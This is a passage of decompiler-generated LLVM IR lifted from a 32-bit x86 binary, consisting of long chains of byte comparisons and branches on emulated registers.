  br i1 %v1_804e4ab, label %dec_label_pc_804e2d1, label %dec_label_pc_804e4b1

dec_label_pc_804e4b1:                             ; preds = %dec_label_pc_804e4a6
  %v0_804e4b1 = load i32, i32* @ebx, align 4
  %v1_804e4b1 = trunc i32 %v0_804e4b1 to i8
  %v11_804e4b1 = icmp eq i8 %v1_804e4b1, -39
  br i1 %v11_804e4b1, label %dec_label_pc_804e2d1, label %dec_label_pc_804e4ba

dec_label_pc_804e4ba:                             ; preds = %dec_label_pc_804e4b1, %dec_label_pc_804e48f
  %v0_804e4ba = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e4ba = trunc i32 %v0_804e4ba to i8
  %v11_804e4ba = icmp eq i8 %v1_804e4ba, -95
  br i1 %v11_804e4ba, label %dec_label_pc_80504e0, label %dec_label_pc_804e4c3

dec_label_pc_804e4c3:                             ; preds = %dec_label_pc_80504e0, %dec_label_pc_804e4ba
  %v11_804e4c3 = icmp eq i8 %v1_804e4ba, -94
  %v1_804e4c6 = zext i1 %v11_804e4c3 to i8
  %v3_804e4c6 = add i32 %v0_804e49f, 86
  %v4_804e4c6 = inttoptr i32 %v3_804e4c6 to i8*
  store i8 %v1_804e4c6, i8* %v4_804e4c6, align 1
  %v0_804e4cb = load i32, i32* @ebx, align 4
  %v1_804e4cb = trunc i32 %v0_804e4cb to i8
  %v7_804e4cb = icmp eq i8 %v1_804e4cb, 32
  %v1_804e4ce = zext i1 %v7_804e4cb to i8
  %v2_804e4ce = load i32, i32* @esp, align 4
  %v3_804e4ce = add i32 %v2_804e4ce, 85
  %v4_804e4ce = inttoptr i32 %v3_804e4ce to i8*
  store i8 %v1_804e4ce, i8* %v4_804e4ce, align 1
  %v0_804e4d3 = load i32, i32* @esp, align 4
  %v1_804e4d3 = add i32 %v0_804e4d3, 86
  %v2_804e4d3 = inttoptr i32 %v1_804e4d3 to i8*
  %v3_804e4d3 = load i8, i8* %v2_804e4d3, align 1
  %v4_804e4d3 = icmp eq i8 %v3_804e4d3, 0
  br i1 %v4_804e4d3, label %dec_label_pc_804e4e5, label %dec_label_pc_804e4da

dec_label_pc_804e4da:                             ; preds = %dec_label_pc_804e4c3
  %v1_804e4da = add i32 %v0_804e4d3, 85
  %v2_804e4da = inttoptr i32 %v1_804e4da to i8*
  %v3_804e4da = load i8, i8* %v2_804e4da, align 1
  %v4_804e4da = icmp eq i8 %v3_804e4da, 0
  %v1_804e4df = icmp eq i1 %v4_804e4da, false
  br i1 %v1_804e4df, label %dec_label_pc_804e2d1, label %dec_label_pc_804e4e5

dec_label_pc_804e4e5:                             ; preds = %dec_label_pc_804e4da, %dec_label_pc_804e4c3
  %v0_804e4e5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e4e5 = trunc i32 %v0_804e4e5 to i8
  %v11_804e4e5 = icmp eq i8 %v1_804e4e5, -101
  %v1_804e4e8 = zext i1 %v11_804e4e5 to i8
  %v3_804e4e8 = add i32 %v0_804e4d3, 84
  %v4_804e4e8 = inttoptr i32 %v3_804e4e8 to i8*
  store i8 %v1_804e4e8, i8* %v4_804e4e8, align 1
  %v0_804e4ed = load i32, i32* @esp, align 4
  %v1_804e4ed = add i32 %v0_804e4ed, 84
  %v2_804e4ed = inttoptr i32 %v1_804e4ed to i8*
  %v3_804e4ed = load i8, i8* %v2_804e4ed, align 1
  %v4_804e4ed = icmp eq i8 %v3_804e4ed, 0
  br i1 %v4_804e4ed, label %dec_label_pc_804e4fd, label %dec_label_pc_804e4f4

dec_label_pc_804e4f4:                             ; preds = %dec_label_pc_804e4e5
  %v0_804e4f4 = load i32, i32* @ebx, align 4
  %v1_804e4f4 = trunc i32 %v0_804e4f4 to i8
  %v7_804e4f4 = icmp eq i8 %v1_804e4f4, 96
  br i1 %v7_804e4f4, label %dec_label_pc_804e2d1, label %dec_label_pc_804e4fd

dec_label_pc_804e4fd:                             ; preds = %dec_label_pc_804e4f4, %dec_label_pc_804e4e5
  %v3_80504be = phi i8 [ 0, %dec_label_pc_804e4e5 ], [ %v3_804e4ed, %dec_label_pc_804e4f4 ]
  %v0_804e4fd = load i32, i32* %eax.global-to-local, align 4
  %v3_804e4fd = trunc i32 %v0_804e4fd to i8
  %v4_804e4fd = icmp eq i8 %v3_804e4fd, 0
  %v4_80504be = icmp eq i8 %v3_80504be, 0
  br i1 %v4_804e4fd, label %dec_label_pc_80504be, label %dec_label_pc_804e505

dec_label_pc_804e505:                             ; preds = %dec_label_pc_804e4fd
  %v1_804e50a = icmp eq i1 %v4_80504be, false
  br i1 %v1_804e50a, label %dec_label_pc_804e2d1, label %dec_label_pc_804e510

dec_label_pc_804e510:                             ; preds = %dec_label_pc_80504c9, %dec_label_pc_80504be, %dec_label_pc_804e505
  %v0_804e510 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e510 = trunc i32 %v0_804e510 to i8
  %v11_804e510 = icmp eq i8 %v1_804e510, -92
  %v1_804e513 = zext i1 %v11_804e510 to i8
  %v3_804e513 = add i32 %v0_804e4ed, 83
  %v4_804e513 = inttoptr i32 %v3_804e513 to i8*
  store i8 %v1_804e513, i8* %v4_804e513, align 1
  %v0_804e518 = load i32, i32* @esp, align 4
  %v1_804e518 = add i32 %v0_804e518, 83
  %v2_804e518 = inttoptr i32 %v1_804e518 to i8*
  %v3_804e518 = load i8, i8* %v2_804e518, align 1
  %v4_804e518 = icmp eq i8 %v3_804e518, 0
  br i1 %v4_804e518, label %dec_label_pc_804e528, label %dec_label_pc_804e51f

dec_label_pc_804e51f:                             ; preds = %dec_label_pc_804e510
  %v0_804e51f = load i32, i32* @ebx, align 4
  %v1_804e51f = trunc i32 %v0_804e51f to i8
  %v11_804e51f = icmp eq i8 %v1_804e51f, -98
  br i1 %v11_804e51f, label %dec_label_pc_804e2d1, label %dec_label_pc_804e528

dec_label_pc_804e528:                             ; preds = %dec_label_pc_804e51f, %dec_label_pc_804e510
  %v0_804e528 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e528 = trunc i32 %v0_804e528 to i8
  %v11_804e528 = icmp eq i8 %v1_804e528, -100
  br i1 %v11_804e528, label %dec_label_pc_80504b0, label %dec_label_pc_804e531

dec_label_pc_804e531:                             ; preds = %dec_label_pc_80504b0, %dec_label_pc_804e528
  %v11_804e531 = icmp eq i8 %v1_804e528, -89
  %v1_804e534 = zext i1 %v11_804e531 to i8
  %v3_804e534 = add i32 %v0_804e518, 82
  %v4_804e534 = inttoptr i32 %v3_804e534 to i8*
  store i8 %v1_804e534, i8* %v4_804e534, align 1
  %v0_804e539 = load i32, i32* @esp, align 4
  %v1_804e539 = add i32 %v0_804e539, 82
  %v2_804e539 = inttoptr i32 %v1_804e539 to i8*
  %v3_804e539 = load i8, i8* %v2_804e539, align 1
  %v4_804e539 = icmp ne i8 %v3_804e539, 0
  %v0_804e54f.pre = load i32, i32* @ebx, align 4
  %v1_804e540 = trunc i32 %v0_804e54f.pre to i8
  %v10_804e540 = icmp eq i8 %v1_804e540, 44
  %or.cond173 = and i1 %v4_804e539, %v10_804e540
  br i1 %or.cond173, label %dec_label_pc_804e2d1, label %dec_label_pc_804e549

dec_label_pc_804e549:                             ; preds = %dec_label_pc_804e531
  %v0_804e549 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e549 = trunc i32 %v0_804e549 to i8
  %v11_804e549 = icmp eq i8 %v1_804e549, -88
  %v1_804e54c = zext i1 %v11_804e549 to i32
  %v2_804e54c = load i32, i32* %eax.global-to-local, align 4
  %v3_804e54c = and i32 %v2_804e54c, -256
  %v4_804e54c = or i32 %v1_804e54c, %v3_804e54c
  store i32 %v4_804e54c, i32* %eax.global-to-local, align 4
  %v10_804e54f = icmp eq i8 %v1_804e540, 68
  %v1_804e552 = zext i1 %v10_804e54f to i8
  %v3_804e552 = add i32 %v0_804e539, 81
  %v4_804e552 = inttoptr i32 %v3_804e552 to i8*
  store i8 %v1_804e552, i8* %v4_804e552, align 1
  %v0_804e557 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e557 = trunc i32 %v0_804e557 to i8
  %v4_804e557 = icmp eq i8 %v3_804e557, 0
  %v2_804e569.pre = load i32, i32* @esp, align 4
  br i1 %v4_804e557, label %dec_label_pc_804e566, label %dec_label_pc_804e55b

dec_label_pc_804e55b:                             ; preds = %dec_label_pc_804e549
  %v1_804e55b = add i32 %v2_804e569.pre, 81
  %v2_804e55b = inttoptr i32 %v1_804e55b to i8*
  %v3_804e55b = load i8, i8* %v2_804e55b, align 1
  %v4_804e55b = icmp eq i8 %v3_804e55b, 0
  %v1_804e560 = icmp eq i1 %v4_804e55b, false
  br i1 %v1_804e560, label %dec_label_pc_804e2d1, label %dec_label_pc_804e566

dec_label_pc_804e566:                             ; preds = %dec_label_pc_804e549, %dec_label_pc_804e55b
  %v0_804e566 = load i32, i32* @ebx, align 4
  %v1_804e566 = trunc i32 %v0_804e566 to i8
  %v10_804e566 = icmp eq i8 %v1_804e566, 85
  %v1_804e569 = zext i1 %v10_804e566 to i8
  %v3_804e569 = add i32 %v2_804e569.pre, 80
  %v4_804e569 = inttoptr i32 %v3_804e569 to i8*
  store i8 %v1_804e569, i8* %v4_804e569, align 1
  %v0_804e56e = load i32, i32* %eax.global-to-local, align 4
  %v3_804e56e = trunc i32 %v0_804e56e to i8
  %v4_804e56e = icmp eq i8 %v3_804e56e, 0
  br i1 %v4_804e56e, label %dec_label_pc_804e566.dec_label_pc_804e586_crit_edge, label %dec_label_pc_804e572

dec_label_pc_804e566.dec_label_pc_804e586_crit_edge: ; preds = %dec_label_pc_804e566
  %v0_804e586.pre = load i32, i32* @ebx, align 4
  %v2_804e589.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e586

dec_label_pc_804e572:                             ; preds = %dec_label_pc_804e566
  %v0_804e572 = load i32, i32* @esp, align 4
  %v1_804e572 = add i32 %v0_804e572, 80
  %v2_804e572 = inttoptr i32 %v1_804e572 to i8*
  %v3_804e572 = load i8, i8* %v2_804e572, align 1
  %v4_804e572 = icmp eq i8 %v3_804e572, 0
  %v1_804e577 = icmp eq i1 %v4_804e572, false
  br i1 %v1_804e577, label %dec_label_pc_804e2d1, label %dec_label_pc_804e57d

dec_label_pc_804e57d:                             ; preds = %dec_label_pc_804e572
  %v0_804e57d = load i32, i32* @ebx, align 4
  %v1_804e57d = trunc i32 %v0_804e57d to i8
  %v10_804e57d = icmp eq i8 %v1_804e57d, 102
  br i1 %v10_804e57d, label %dec_label_pc_804e2d1, label %dec_label_pc_804e586

dec_label_pc_804e586:                             ; preds = %dec_label_pc_804e566.dec_label_pc_804e586_crit_edge, %dec_label_pc_804e57d
  %v2_804e589 = phi i32 [ %v2_804e589.pre, %dec_label_pc_804e566.dec_label_pc_804e586_crit_edge ], [ %v0_804e572, %dec_label_pc_804e57d ]
  %v0_804e586 = phi i32 [ %v0_804e586.pre, %dec_label_pc_804e566.dec_label_pc_804e586_crit_edge ], [ %v0_804e57d, %dec_label_pc_804e57d ]
  %v1_804e586 = trunc i32 %v0_804e586 to i8
  %v10_804e586 = icmp eq i8 %v1_804e586, 59
  %v1_804e589 = zext i1 %v10_804e586 to i8
  %v3_804e589 = add i32 %v2_804e589, 79
  %v4_804e589 = inttoptr i32 %v3_804e589 to i8*
  store i8 %v1_804e589, i8* %v4_804e589, align 1
  %v0_804e58e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e58e = trunc i32 %v0_804e58e to i8
  %v11_804e58e = icmp eq i8 %v1_804e58e, -53
  %v0_80504a0 = load i32, i32* @esp, align 4
  br i1 %v11_804e58e, label %dec_label_pc_80504a0, label %dec_label_pc_804e597

dec_label_pc_804e597:                             ; preds = %dec_label_pc_804e586, %dec_label_pc_80504a0
  %v0_804e597 = load i32, i32* @ebx, align 4
  %v1_804e597 = trunc i32 %v0_804e597 to i8
  %v10_804e597 = icmp eq i8 %v1_804e597, 34
  %v1_804e59a = zext i1 %v10_804e597 to i8
  %v3_804e59a = add i32 %v0_80504a0, 78
  %v4_804e59a = inttoptr i32 %v3_804e59a to i8*
  store i8 %v1_804e59a, i8* %v4_804e59a, align 1
  %v0_804e59f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e59f = trunc i32 %v0_804e59f to i8
  %v11_804e59f = icmp eq i8 %v1_804e59f, -52
  %v0_8050490 = load i32, i32* @esp, align 4
  br i1 %v11_804e59f, label %dec_label_pc_8050490, label %dec_label_pc_804e5a8

dec_label_pc_804e5a8:                             ; preds = %dec_label_pc_804e597, %dec_label_pc_8050490
  %v11_804e5a8 = icmp eq i8 %v1_804e59f, -49
  %v1_804e5ab = zext i1 %v11_804e5a8 to i8
  %v3_804e5ab = add i32 %v0_8050490, 77
  %v4_804e5ab = inttoptr i32 %v3_804e5ab to i8*
  store i8 %v1_804e5ab, i8* %v4_804e5ab, align 1
  %v0_804e5b0 = load i32, i32* @esp, align 4
  %v1_804e5b0 = add i32 %v0_804e5b0, 77
  %v2_804e5b0 = inttoptr i32 %v1_804e5b0 to i8*
  %v3_804e5b0 = load i8, i8* %v2_804e5b0, align 1
  %v4_804e5b0 = icmp ne i8 %v3_804e5b0, 0
  %v0_804e5c6.pre = load i32, i32* @ebx, align 4
  %v1_804e5b7 = trunc i32 %v0_804e5c6.pre to i8
  %v10_804e5b7 = icmp eq i8 %v1_804e5b7, 30
  %or.cond174 = and i1 %v4_804e5b0, %v10_804e5b7
  br i1 %or.cond174, label %dec_label_pc_804e2d1, label %dec_label_pc_804e5c0

dec_label_pc_804e5c0:                             ; preds = %dec_label_pc_804e5a8
  %v0_804e5c0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e5c0 = trunc i32 %v0_804e5c0 to i8
  %v10_804e5c0 = icmp eq i8 %v1_804e5c0, 117
  %v1_804e5c3 = zext i1 %v10_804e5c0 to i32
  %v2_804e5c3 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e5c3 = and i32 %v2_804e5c3, -256
  %v4_804e5c3 = or i32 %v1_804e5c3, %v3_804e5c3
  store i32 %v4_804e5c3, i32* %eax.global-to-local, align 4
  %v10_804e5c6 = icmp eq i8 %v1_804e5b7, 55
  %v1_804e5c9 = zext i1 %v10_804e5c6 to i8
  %v3_804e5c9 = add i32 %v0_804e5b0, 76
  %v4_804e5c9 = inttoptr i32 %v3_804e5c9 to i8*
  store i8 %v1_804e5c9, i8* %v4_804e5c9, align 1
  %v0_804e5ce = load i32, i32* %eax.global-to-local, align 4
  %v3_804e5ce = trunc i32 %v0_804e5ce to i8
  %v4_804e5ce = icmp eq i8 %v3_804e5ce, 0
  %v2_804e5e0.pre = load i32, i32* @esp, align 4
  br i1 %v4_804e5ce, label %dec_label_pc_804e5dd, label %dec_label_pc_804e5d2

dec_label_pc_804e5d2:                             ; preds = %dec_label_pc_804e5c0
  %v1_804e5d2 = add i32 %v2_804e5e0.pre, 76
  %v2_804e5d2 = inttoptr i32 %v1_804e5d2 to i8*
  %v3_804e5d2 = load i8, i8* %v2_804e5d2, align 1
  %v4_804e5d2 = icmp eq i8 %v3_804e5d2, 0
  %v1_804e5d7 = icmp eq i1 %v4_804e5d2, false
  br i1 %v1_804e5d7, label %dec_label_pc_804e2d1, label %dec_label_pc_804e5dd

dec_label_pc_804e5dd:                             ; preds = %dec_label_pc_804e5c0, %dec_label_pc_804e5d2
  %v0_804e5dd = load i32, i32* @ebx, align 4
  %v1_804e5dd = trunc i32 %v0_804e5dd to i8
  %v10_804e5dd = icmp eq i8 %v1_804e5dd, 56
  %v1_804e5e0 = zext i1 %v10_804e5dd to i8
  %v3_804e5e0 = add i32 %v2_804e5e0.pre, 75
  %v4_804e5e0 = inttoptr i32 %v3_804e5e0 to i8*
  store i8 %v1_804e5e0, i8* %v4_804e5e0, align 1
  %v0_804e5e5 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e5e5 = trunc i32 %v0_804e5e5 to i8
  %v4_804e5e5 = icmp eq i8 %v3_804e5e5, 0
  %v2_804e5f7.pre = load i32, i32* @esp, align 4
  br i1 %v4_804e5e5, label %dec_label_pc_804e5f4, label %dec_label_pc_804e5e9

dec_label_pc_804e5e9:                             ; preds = %dec_label_pc_804e5dd
  %v1_804e5e9 = add i32 %v2_804e5f7.pre, 75
  %v2_804e5e9 = inttoptr i32 %v1_804e5e9 to i8*
  %v3_804e5e9 = load i8, i8* %v2_804e5e9, align 1
  %v4_804e5e9 = icmp eq i8 %v3_804e5e9, 0
  %v1_804e5ee = icmp eq i1 %v4_804e5e9, false
  br i1 %v1_804e5ee, label %dec_label_pc_804e2d1, label %dec_label_pc_804e5f4

dec_label_pc_804e5f4:                             ; preds = %dec_label_pc_804e5dd, %dec_label_pc_804e5e9
  %v0_804e5f4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e5f4 = trunc i32 %v0_804e5f4 to i8
  %v7_804e5f4 = icmp eq i8 %v1_804e5f4, 80
  %v1_804e5f7 = zext i1 %v7_804e5f4 to i8
  %v3_804e5f7 = add i32 %v2_804e5f7.pre, 74
  %v4_804e5f7 = inttoptr i32 %v3_804e5f7 to i8*
  store i8 %v1_804e5f7, i8* %v4_804e5f7, align 1
  %v0_804e5fc = load i32, i32* @esp, align 4
  %v1_804e5fc = add i32 %v0_804e5fc, 74
  %v2_804e5fc = inttoptr i32 %v1_804e5fc to i8*
  %v3_804e5fc = load i8, i8* %v2_804e5fc, align 1
  %v4_804e5fc = icmp eq i8 %v3_804e5fc, 0
  br i1 %v4_804e5fc, label %dec_label_pc_804e60c, label %dec_label_pc_804e603

dec_label_pc_804e603:                             ; preds = %dec_label_pc_804e5f4
  %v0_804e603 = load i32, i32* @ebx, align 4
  %v1_804e603 = trunc i32 %v0_804e603 to i8
  %v11_804e603 = icmp eq i8 %v1_804e603, -21
  br i1 %v11_804e603, label %dec_label_pc_804e2d1, label %dec_label_pc_804e60c

dec_label_pc_804e60c:                             ; preds = %dec_label_pc_804e603, %dec_label_pc_804e5f4
  %v1_804e60c = add i32 %v0_804e5fc, 77
  %v2_804e60c = inttoptr i32 %v1_804e60c to i8*
  %v3_804e60c = load i8, i8* %v2_804e60c, align 1
  %v4_804e60c = icmp eq i8 %v3_804e60c, 0
  br i1 %v4_804e60c, label %dec_label_pc_804e61c, label %dec_label_pc_804e613

dec_label_pc_804e613:                             ; preds = %dec_label_pc_804e60c
  %v0_804e613 = load i32, i32* @ebx, align 4
  %v1_804e613 = trunc i32 %v0_804e613 to i8
  %v10_804e613 = icmp eq i8 %v1_804e613, 120
  br i1 %v10_804e613, label %dec_label_pc_804e2d1, label %dec_label_pc_804e61c

dec_label_pc_804e61c:                             ; preds = %dec_label_pc_804e613, %dec_label_pc_804e60c
  %v0_804e61c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e61c = trunc i32 %v0_804e61c to i8
  %v11_804e61c = icmp eq i8 %v1_804e61c, -47
  %v1_804e61f = zext i1 %v11_804e61c to i8
  %v3_804e61f = add i32 %v0_804e5fc, 73
  %v4_804e61f = inttoptr i32 %v3_804e61f to i8*
  store i8 %v1_804e61f, i8* %v4_804e61f, align 1
  %v0_804e624 = load i32, i32* @esp, align 4
  %v1_804e624 = add i32 %v0_804e624, 73
  %v2_804e624 = inttoptr i32 %v1_804e624 to i8*
  %v3_804e624 = load i8, i8* %v2_804e624, align 1
  %v4_804e624 = icmp eq i8 %v3_804e624, 0
  br i1 %v4_804e624, label %dec_label_pc_804e634, label %dec_label_pc_804e62b

dec_label_pc_804e62b:                             ; preds = %dec_label_pc_804e61c
  %v0_804e62b = load i32, i32* @ebx, align 4
  %v1_804e62b = trunc i32 %v0_804e62b to i8
  %v10_804e62b = icmp eq i8 %v1_804e62b, 35
  br i1 %v10_804e62b, label %dec_label_pc_804e2d1, label %dec_label_pc_804e634

dec_label_pc_804e634:                             ; preds = %dec_label_pc_804e62b, %dec_label_pc_804e61c
  %v0_804e634 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e634 = trunc i32 %v0_804e634 to i8
  %v7_804e634 = icmp eq i8 %v1_804e634, 64
  %v1_804e637 = zext i1 %v7_804e634 to i8
  %v3_804e637 = add i32 %v0_804e624, 72
  %v4_804e637 = inttoptr i32 %v3_804e637 to i8*
  store i8 %v1_804e637, i8* %v4_804e637, align 1
  %v0_804e63c = load i32, i32* @esp, align 4
  %v1_804e63c = add i32 %v0_804e63c, 72
  %v2_804e63c = inttoptr i32 %v1_804e63c to i8*
  %v3_804e63c = load i8, i8* %v2_804e63c, align 1
  %v4_804e63c = icmp eq i8 %v3_804e63c, 0
  br i1 %v4_804e63c, label %dec_label_pc_804e64c, label %dec_label_pc_804e643

dec_label_pc_804e643:                             ; preds = %dec_label_pc_804e634
  %v0_804e643 = load i32, i32* @ebx, align 4
  %v1_804e643 = trunc i32 %v0_804e643 to i8
  %v10_804e643 = icmp eq i8 %v1_804e643, 70
  br i1 %v10_804e643, label %dec_label_pc_804e2d1, label %dec_label_pc_804e64c

dec_label_pc_804e64c:                             ; preds = %dec_label_pc_804e643, %dec_label_pc_804e634
  %v0_804e64c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e64c = trunc i32 %v0_804e64c to i8
  %v11_804e64c = icmp eq i8 %v1_804e64c, -84
  %v1_804e64f = zext i1 %v11_804e64c to i8
  %v3_804e64f = add i32 %v0_804e63c, 71
  %v4_804e64f = inttoptr i32 %v3_804e64f to i8*
  store i8 %v1_804e64f, i8* %v4_804e64f, align 1
  %v0_804e654 = load i32, i32* @ebx, align 4
  %v1_804e654 = trunc i32 %v0_804e654 to i8
  %tmp656 = icmp ugt i8 %v1_804e654, 15
  %v4_804e657 = zext i1 %tmp656 to i8
  %v5_804e657 = load i32, i32* @esp, align 4
  %v6_804e657 = add i32 %v5_804e657, 70
  %v7_804e657 = inttoptr i32 %v6_804e657 to i8*
  store i8 %v4_804e657, i8* %v7_804e657, align 1
  %v0_804e65c = load i32, i32* @esp, align 4
  %v1_804e65c = add i32 %v0_804e65c, 71
  %v2_804e65c = inttoptr i32 %v1_804e65c to i8*
  %v3_804e65c = load i8, i8* %v2_804e65c, align 1
  %v4_804e65c = icmp eq i8 %v3_804e65c, 0
  br i1 %v4_804e65c, label %dec_label_pc_804e673, label %dec_label_pc_804e663

dec_label_pc_804e663:                             ; preds = %dec_label_pc_804e64c
  %v1_804e663 = add i32 %v0_804e65c, 70
  %v2_804e663 = inttoptr i32 %v1_804e663 to i8*
  %v3_804e663 = load i8, i8* %v2_804e663, align 1
  %v4_804e663 = icmp eq i8 %v3_804e663, 0
  br i1 %v4_804e663, label %dec_label_pc_804e673, label %dec_label_pc_804e66a

dec_label_pc_804e66a:                             ; preds = %dec_label_pc_804e663
  %v0_804e66a = load i32, i32* @ebx, align 4
  %v1_804e66a = trunc i32 %v0_804e66a to i8
  %tmp657 = icmp ult i8 %v1_804e66a, 32
  br i1 %tmp657, label %dec_label_pc_804e2d1, label %dec_label_pc_804e673

dec_label_pc_804e673:                             ; preds = %dec_label_pc_804e66a, %dec_label_pc_804e663, %dec_label_pc_804e64c
  %v0_804e673 = load i32, i32* @ebx, align 4
  %v1_804e673 = trunc i32 %v0_804e673 to i8
  %tmp = icmp ugt i8 %v1_804e673, 63
  %v4_804e676 = zext i1 %tmp to i8
  %v6_804e676 = add i32 %v0_804e65c, 69
  %v7_804e676 = inttoptr i32 %v6_804e676 to i8*
  store i8 %v4_804e676, i8* %v7_804e676, align 1
  %v0_804e67b = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e67b = trunc i32 %v0_804e67b to i8
  %v10_804e67b = icmp eq i8 %v1_804e67b, 100
  %v0_8050469 = load i32, i32* @esp, align 4
  br i1 %v10_804e67b, label %dec_label_pc_8050469, label %dec_label_pc_804e684

dec_label_pc_804e684:                             ; preds = %dec_label_pc_804e673, %dec_label_pc_8050474, %dec_label_pc_8050469
  %v11_804e684 = icmp eq i8 %v1_804e67b, -87
  %v1_804e687 = zext i1 %v11_804e684 to i8
  %v3_804e687 = add i32 %v0_8050469, 68
  %v4_804e687 = inttoptr i32 %v3_804e687 to i8*
  store i8 %v1_804e687, i8* %v4_804e687, align 1
  %v0_804e68c = load i32, i32* @ebx, align 4
  %v1_804e68c = trunc i32 %v0_804e68c to i8
  %v11_804e68c = icmp eq i8 %v1_804e68c, -2
  %v1_804e68f = zext i1 %v11_804e68c to i8
  %v2_804e68f = load i32, i32* @esp, align 4
  %v3_804e68f = add i32 %v2_804e68f, 67
  %v4_804e68f = inttoptr i32 %v3_804e68f to i8*
  store i8 %v1_804e68f, i8* %v4_804e68f, align 1
  %v0_804e694 = load i32, i32* @esp, align 4
  %v1_804e694 = add i32 %v0_804e694, 68
  %v2_804e694 = inttoptr i32 %v1_804e694 to i8*
  %v3_804e694 = load i8, i8* %v2_804e694, align 1
  %v4_804e694 = icmp eq i8 %v3_804e694, 0
  br i1 %v4_804e694, label %dec_label_pc_804e6a6, label %dec_label_pc_804e69b

dec_label_pc_804e69b:                             ; preds = %dec_label_pc_804e684
  %v1_804e69b = add i32 %v0_804e694, 67
  %v2_804e69b = inttoptr i32 %v1_804e69b to i8*
  %v3_804e69b = load i8, i8* %v2_804e69b, align 1
  %v4_804e69b = icmp eq i8 %v3_804e69b, 0
  %v1_804e6a0 = icmp eq i1 %v4_804e69b, false
  br i1 %v1_804e6a0, label %dec_label_pc_804e2d1, label %dec_label_pc_804e6a6

dec_label_pc_804e6a6:                             ; preds = %dec_label_pc_804e69b, %dec_label_pc_804e684
  %v0_804e6a6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e6a6 = trunc i32 %v0_804e6a6 to i8
  %v11_804e6a6 = icmp eq i8 %v1_804e6a6, -58
  %v1_804e6a9 = zext i1 %v11_804e6a6 to i8
  %v3_804e6a9 = add i32 %v0_804e694, 66
  %v4_804e6a9 = inttoptr i32 %v3_804e6a9 to i8*
  store i8 %v1_804e6a9, i8* %v4_804e6a9, align 1
  %v0_804e6ae = load i32, i32* @esp, align 4
  %v1_804e6ae = add i32 %v0_804e6ae, 66
  %v2_804e6ae = inttoptr i32 %v1_804e6ae to i8*
  %v3_804e6ae = load i8, i8* %v2_804e6ae, align 1
  %v4_804e6ae = icmp eq i8 %v3_804e6ae, 0
  %v0_804e6d8.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_804e6ae, label %dec_label_pc_804e6c3, label %dec_label_pc_804e6b5

dec_label_pc_804e6b5:                             ; preds = %dec_label_pc_804e6a6
  %v1_804e6b5 = trunc i32 %v0_804e6d8.pre.pre to i8
  %tmp658 = icmp ugt i8 %v1_804e6b5, 17
  %tmp659 = or i8 %v1_804e6b5, 1
  %tmp660 = icmp eq i8 %tmp659, 19
  %or.cond176 = and i1 %tmp658, %tmp660
  br i1 %or.cond176, label %dec_label_pc_804e2d1, label %dec_label_pc_804e6c3

dec_label_pc_804e6c3:                             ; preds = %dec_label_pc_804e6a6, %dec_label_pc_804e6b5
  %v1_804e6c3 = add i32 %v0_804e6ae, 72
  %v2_804e6c3 = inttoptr i32 %v1_804e6c3 to i8*
  %v3_804e6c3 = load i8, i8* %v2_804e6c3, align 1
  %v4_804e6c3 = icmp ne i8 %v3_804e6c3, 0
  %.pre629 = trunc i32 %v0_804e6d8.pre.pre to i8
  %v1_804e6ca.off = add i8 %.pre629, -69
  %tmp661 = icmp ult i8 %v1_804e6ca.off, -98
  %or.cond651 = and i1 %v4_804e6c3, %tmp661
  br i1 %or.cond651, label %dec_label_pc_804e2d1, label %dec_label_pc_804e6d8

dec_label_pc_804e6d8:                             ; preds = %dec_label_pc_804e6c3
  %tmp138 = icmp ugt i8 %.pre629, 34
  %v4_804e6db = zext i1 %tmp138 to i8
  %v6_804e6db = add i32 %v0_804e6ae, 65
  %v7_804e6db = inttoptr i32 %v6_804e6db to i8*
  store i8 %v4_804e6db, i8* %v7_804e6db, align 1
  %v0_804e6e0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e6e0 = trunc i32 %v0_804e6e0 to i8
  switch i8 %v1_804e6e0, label %dec_label_pc_804e6fb [
    i8 -128, label %dec_label_pc_8050450
    i8 -127, label %dec_label_pc_8050439
    i8 -126, label %dec_label_pc_8050422
  ]

dec_label_pc_804e6fb:                             ; preds = %dec_label_pc_805045b, %dec_label_pc_8050439, %dec_label_pc_8050422, %dec_label_pc_804e6d8, %dec_label_pc_8050450
  %v0_804e6fb = load i32, i32* @ebx, align 4
  %v1_804e6fb = trunc i32 %v0_804e6fb to i8
  %tmp139 = icmp ult i8 %v1_804e6fb, 3
  %v3_804e6fe = zext i1 %tmp139 to i32
  %v4_804e6fe = load i32, i32* %eax.global-to-local, align 4
  %v5_804e6fe = and i32 %v4_804e6fe, -256
  %v6_804e6fe = or i32 %v3_804e6fe, %v5_804e6fe
  %v7_804e6fe = xor i32 %v6_804e6fe, 1
  store i32 %v7_804e6fe, i32* %eax.global-to-local, align 4
  %v11_804e701 = icmp eq i8 %v1_804e6e0, -125
  %v3_805040c = trunc i32 %v7_804e6fe to i8
  %v4_805040c.not453 = icmp ne i8 %v3_805040c, 0
  br i1 %v11_804e701, label %dec_label_pc_805040c, label %dec_label_pc_804e70a

dec_label_pc_804e70a:                             ; preds = %dec_label_pc_804e6fb
  %v11_804e70e = icmp eq i8 %v1_804e6e0, -124
  %or.cond178 = and i1 %v11_804e70e, %v4_805040c.not453
  %tmp662 = icmp ult i8 %v1_804e6fb, -5
  %or.cond282 = and i1 %tmp662, %or.cond178
  br i1 %or.cond282, label %dec_label_pc_804e2d1, label %dec_label_pc_804e717

dec_label_pc_804e717.thread:                      ; preds = %dec_label_pc_805040c
  %tmp140427 = icmp ult i8 %v1_804e6fb, 5
  %v3_804e71a428 = zext i1 %tmp140427 to i32
